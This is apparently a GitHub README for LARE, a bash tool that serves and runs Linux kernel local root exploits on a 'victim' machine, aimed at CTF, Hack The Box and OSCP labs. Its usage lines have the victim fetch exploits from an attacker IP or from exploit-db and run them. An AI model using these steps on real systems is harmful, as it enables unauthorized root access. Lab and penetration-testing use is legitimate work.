# LARE
<b>[L]</b>ocal <b>[A]</b>uto <b>[R]</b>oot <b>[E]</b>xploiter is a simple bash script that helps you deploy local root exploits from your attacking machine when your victim machine do not have internet connectivity.

The script is useful in a scenario where your victim machine do not have an internet connection (eg.) while you pivot into internal networks or playing CTFs which uses VPN to connect to there closed labs (eg.) hackthebox.gr or even in OSCP labs.
The script uses Local root exploits for Linux Kernel 2.6-4.8

This script is inspired by <b>Nilotpal Biswas's <a href='https://github.com/nilotpalbiswas/Auto-Root-Exploit'>Auto Root Exploit Tool </a></b>

# Usage: 

<img src = 'https://github.com/EnigmaDimitri/LARE/blob/test-run/screencaps/help.png'>

<H3>1- Attacking Victimin Closed Network</H3>
You have to first set the exploit arsenal on the attacking machine  and start the apache2 instatnce using the following command.
<b><code>
bash LARE.sh -a  or ./LARE.sh -a
</code></b><br>

<img src = 'https://github.com/EnigmaDimitri/LARE/blob/test-run/screencaps/arsenal.png'>
Once done with it, You have to copy the script to the victim machine via any means (wget, ftp, curl etc). and run the Exploiter locally with the following command:
<b><code>
bash LARE.sh -l [Attackers-IP]  or ./LARE.sh -l [Attackers-IP]
</code></b><br>

<img src = 'https://github.com/EnigmaDimitri/LARE/blob/test-run/screencaps/local.png'>

<H3>2- Attacking Victim with Internet Acess</H3>
In this scenario the script is to be ran on the victims machine and it will get the exploits from the exploit-db's github repository and use it for exploitation directly.
This is the original fuctionality of Auto Root Exploit Tool with some fine tunning done.
Run the Exploiter with the following command:
<b><code>
bash LARE.sh -l <Attackers-IP>  or ./LARE.sh -l <Attackers-IP>
</code></b><br>
<img src = 'https://github.com/EnigmaDimitri/LARE/blob/test-run/screencaps/remote.png'>

# Note 

The script runs multiple kernal exploits on the machine which can result in unstability of the system, it is highly recommended to uses it as the last resort and in a non-production environment.


